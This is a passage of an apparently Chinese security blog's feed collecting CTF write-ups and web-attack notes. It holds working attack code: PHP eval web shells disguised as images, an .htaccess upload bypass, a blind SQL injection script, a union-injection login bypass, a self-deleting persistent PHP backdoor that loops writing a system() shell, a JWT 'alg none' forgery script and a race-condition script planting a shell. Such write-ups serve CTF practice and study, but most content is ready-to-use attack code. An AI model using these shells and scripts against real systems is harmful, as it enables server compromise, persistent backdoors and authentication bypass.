href="#lt-MRCTF2020-gt-你传你——呢" class="headerlink" title="&lt;MRCTF2020&gt;你传你——呢"></a>&lt;MRCTF2020&gt;你传你——呢</h1><p>简单的文件上传，上传测试，”.jpg”和”.htaccess” 可以上传，同时还会给出路径<br>分别上传然后蚁剑连接</p><p>a.jpg</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF8a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string single-quoted-string">'php'</span><span class="token operator">></span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'door'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>.htaccess</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token operator">.</span>jpg <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="lt-CISCN2019-华北赛区-Day2-Web1-gt-Hack-World"><a href="#lt-CISCN2019-华北赛区-Day2-Web1-gt-Hack-World" class="headerlink" title="&lt;CISCN2019 华北赛区 Day2 Web1&gt;Hack World"></a>&lt;CISCN2019 华北赛区 Day2 Web1&gt;Hack World</h1><p>打开题目，简单测试发现是数字型注入且大部分关键字都被过滤，尝试布尔盲注。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">id=0^((substr((select(flag)from(flag)),1,1))='f')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>回显id=1时的界面<br>说明注入成功，用脚本即可跑出flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://88cefe6c-611d-488c-89c1-a6ae8a08a682.node4.buuoj.cn:81/index.php"</span>dat <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"id"</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">&#125;</span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">">"</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">> "</span></span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> u <span class="token keyword">in</span> <span class="token string">"&#125;-&#123;qazxswedcvfrtgbnhyujmkiolp1234567890"</span><span class="token punctuation">:</span>        dat<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"0^((substr((select(flag)from(flag)),"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">",1))='"</span><span class="token operator">+</span>u<span class="token operator">+</span><span class="token string">"')"</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>dat<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Hello"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span>            a<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u<span class="token punctuation">)</span>            <span class="token keyword">if</span> u <span class="token operator">==</span> <span class="token string">"&#125;"</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> w <span class="token keyword">in</span> a<span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="https://img-blog.csdnimg.cn/c6f3870ab3824225b6f3cd34934f94e7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZDB1ZA==,size_17,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><p>  要注意的是，”-“被过滤了，需要在未得到值的地方将其加上</p><h1 id="lt-GXYCTF2019-gt-BabySQli"><a href="#lt-GXYCTF2019-gt-BabySQli" class="headerlink" title="&lt;GXYCTF2019&gt;BabySQli"></a>&lt;GXYCTF2019&gt;BabySQli</h1><p>打开题目，测试登录功能，username存在注入，password不存在<br>测试注入点，过滤了  or （可用OR绕过）、= 以及括号，堆叠注入不可行</p><p>但可以注意到，分别有’worry user’和’worry pass’ 两种正常返回，说明这是分开查询的，或者是先查询出再分别对比。</p><p>有趣的是在登录返回的页面发现不明字符串</p><blockquote><p>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p></blockquote><p>尝试解密，base32解密得到新的字符串</p><blockquote><p>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</p></blockquote><p>显然，再用base64解密</p><blockquote><p>select * from user where username = ‘$name’</p></blockquote><p>那么就是先查询，查询不到数据则 ‘ worry user’,再用查询出来的数据对比password，对比不符合则 ‘ worry pass ‘<br>既然username存在注入点，那么就可以控制查询出的数据,也就是使查询出的密码符合传递过去的密码</p><p>首先看字段数，利用 ‘ select 1,2,3,4…’ 可以查出是三个字段</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">name=1' union select 1,2,3;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按照常规，三个字段分别为 ‘id’，’username’，’password’ ，因此对字段进行修改，一般加密方法为MySQLSHA1或MD5，最终发现是MD5</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">name=1' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&amp;pw=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;lt-BJDCTF2020-gt-EasySearch-1&quot;&gt;&lt;a href=&quot;#lt-BJDCTF2020-gt-EasySearch-1&quot; class=&quot;headerlink&quot; title=&quot;&amp;lt;BJDCTF2020&amp;gt;EasySearch 1&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>不死马</title>
    <link href="http://example.com/%E4%B8%8D%E6%AD%BB%E9%A9%AC/"/>
    <id>http://example.com/%E4%B8%8D%E6%AD%BB%E9%A9%AC/</id>
    <published>2023-09-05T01:29:34.714Z</published>
    <updated>2022-05-25T07:22:56.269Z</updated>
    
    <content type="html"><![CDATA[<p>不死马，即难以清除的木马。<br>一般原理为：在可以上传文件的情况下，上传一个可执行文件，这个文件的作用是在服务端创建一个进程，然后删除自身，创建的进程会不停的在服务端生成木马文件。<br>网上最常见的脚本为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.shell.php'</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_GET["pass"])=="2591c98b70119fe624898b1e424b5e91")&#123;@system($_POST[cmd]);&#125; ?>'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;不死马，即难以清除的木马。&lt;br&gt;一般原理为：在可以上传文件的情况下，上传一个可执行文件，这个文件的作用是在服务端创建一个进程，然后删除自身，创建的进程会不停的在服务端生成木马文件。&lt;br&gt;网上最常见的脚本为&lt;/p&gt;
&lt;pre class=&quot;line-numbers lan</summary>
      
    
    
    
    <category term="file upload" scheme="http://example.com/categories/file-upload/"/>
    
    
    <category term="basic" scheme="http://example.com/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>shell upload</title>
    <link href="http://example.com/shell%20upload/"/>
    <id>http://example.com/shell%20upload/</id>
    <published>2023-09-05T01:29:34.695Z</published>
    <updated>2022-04-25T05:04:46.140Z</updated>
    
    <content type="html"><![CDATA[<p>前端文件后缀限制</p><ol><li>抓包修改</li></ol><p>后端文件后缀限制</p><ol><li>上传.user.ini文件或.htaccess文件<blockquote><p>PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>两个新的 INI 指令， user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。</p><p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p><p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p></blockquote></li></ol><p>.user.ini</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">auto_prepend_file=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file_path</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>.htaccess</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">AddType application/x-httpd-php .jpg <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FileMatch</span> <span class="token attr-name">"&lt;file_name</span><span class="token punctuation">></span></span>">SetHandler application/x-httpd-php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FileMatch</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>利用解析漏洞，加上无法解析的后缀，如上传shell.php.abc</li></ol><p>文件头检查</p><ol><li>加上图片文件头，如GIF8a</li></ol><p>文件内容检查</p><ol><li>&lt;script language=’php’&gt; 代替 &lt;?php</li><li></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前端文件后缀限制&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;抓包修改&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;后端文件后缀限制&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;上传.user.ini文件或.htaccess文件&lt;blockquote&gt;
&lt;p&gt;PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CG</summary>
      
    
    
    
    <category term="file upload" scheme="http://example.com/categories/file-upload/"/>
    
    
    <category term="basic" scheme="http://example.com/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>php字符串与数值比较</title>
    <link href="http://example.com/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%80%BC%E6%AF%94%E8%BE%83/"/>
    <id>http://example.com/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%80%BC%E6%AF%94%E8%BE%83/</id>
    <published>2023-09-05T01:29:34.692Z</published>
    <updated>2022-04-25T05:07:26.010Z</updated>
    
    <content type="html"><![CDATA[<p>PHP是一门弱类型语言，当涉及“==”判断时，它的表现是有一些奇特的。<br>例如，“a==0”将会得到true，“a==1”将会得到false。</p><p>原理：PHP语言中在涉及“==”判断时，如果运算符两边分别为字符串（不以数字开头的字符串），会将字符串转化为数字0，再进行比较。如果是以数字开头的字符串，那么它将会转化成开头的数字（即第一个字母前的所有数字）。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"787abe"</span><span class="token operator">=</span><span class="token number">787</span>   <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"abc"</span><span class="token operator">=</span><span class="token number">0</span>    <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"1a2b"</span><span class="token operator">=</span><span class="token number">1</span>    <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"a12b"</span><span class="token operator">=</span><span class="token number">0</span>    <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"000123abc"</span><span class="token operator">=</span><span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例外：(int)”1e2”==100，在PHP中若像这种格式的字符串转化成数字，PHP会将其视为科学计数法。<br>(int)”1e2abc”=(int)”1e2”=100<br>(int )”1eabce”=1</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHP是一门弱类型语言，当涉及“==”判断时，它的表现是有一些奇特的。&lt;br&gt;例如，“a==0”将会得到true，“a==1”将会得到false。&lt;/p&gt;
&lt;p&gt;原理：PHP语言中在涉及“==”判断时，如果运算符两边分别为字符串（不以数字开头的字符串），会将字符串转化为数字</summary>
      
    
    
    
    <category term="code audit" scheme="http://example.com/categories/code-audit/"/>
    
    
    <category term="basic" scheme="http://example.com/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>web directory</title>
    <link href="http://example.com/basic_web_directory/"/>
    <id>http://example.com/basic_web_directory/</id>
    <published>2023-09-05T01:29:34.687Z</published>
    <updated>2022-04-25T05:12:49.869Z</updated>
    
    <content type="html"><![CDATA[<p><code>nginx</code>网站目录</p><pre class="line-numbers language-none"><code class="language-none">配置文件存放目录：&#x2F;etc&#x2F;nginx主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;code&gt;nginx&lt;/code&gt;网站目录&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;配置文件存放目录：&amp;#x2F;etc&amp;#x2F;nginx
主配置文件：&amp;#x2F;</summary>
      
    
    
    
    <category term="another" scheme="http://example.com/categories/another/"/>
    
    
    <category term="basic" scheme="http://example.com/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>jwt forge</title>
    <link href="http://example.com/forge%20jwt/"/>
    <id>http://example.com/forge%20jwt/</id>
    <published>2022-04-12T16:00:00.000Z</published>
    <updated>2022-04-16T08:50:01.722Z</updated>
    
    <content type="html"><![CDATA[<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64a <span class="token operator">=</span> <span class="token string">'&#123;"alg":"none","typ":"JWT"&#125;'</span>b<span class="token operator">=</span> <span class="token string">'&#123;"secretid":[],"username":"admin","password":"a","iat":1649828192&#125;'</span>c <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>a<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'.'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        c<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;pre class=&quot;line-numbers language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; bas</summary>
      
    
    
    
    <category term="authentication" scheme="http://example.com/categories/authentication/"/>
    
    
    <category term="script" scheme="http://example.com/tags/script/"/>
    
  </entry>
  
  <entry>
    <title>race conditions</title>
    <link href="http://example.com/race_conditions_1/"/>
    <id>http://example.com/race_conditions_1/</id>
    <published>2021-11-20T16:00:00.000Z</published>
    <updated>2022-04-16T08:51:46.274Z</updated>
    
    <content type="html"><![CDATA[<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> io<span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread<span class="token keyword">from</span> time <span class="token keyword">import</span> sleepur<span class="token operator">=</span><span class="token string">'http://9fe5d7d0-6a86-40a8-b6e3-6a6ed9d00084.node4.buuoj.cn:81/flflflflag.php'</span>dat<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php fputs(fopen('a.php','w'),'&lt;?php eval($_GET[door])?>');?>"</span><span class="token punctuation">&#125;</span>fil<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'a.txt'</span><span class="token punctuation">,</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>cooki<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span><span class="token string">'abc'</span><span class="token punctuation">&#125;</span>par<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'/tmp/sess_abc'</span><span class="token punctuation">&#125;</span>ses<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> ses<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>ur<span class="token punctuation">,</span>data<span class="token operator">=</span>dat<span class="token punctuation">,</span>files<span class="token operator">=</span>fil<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cooki<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">!=</span><span class="token number">200</span><span class="token punctuation">:</span>            sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>a<span class="token operator">=</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>Upload<span class="token punctuation">)</span>a<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    ses<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>ur<span class="token punctuation">,</span>params<span class="token operator">=</span>par<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;pre class=&quot;line-numbers language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; req</summary>
      
    
    
    
    <category term="file upload" scheme="http://example.com/categories/file-upload/"/>
    
    
    <category term="script" scheme="http://example.com/tags/script/"/>
    
  </entry>
  
</feed>
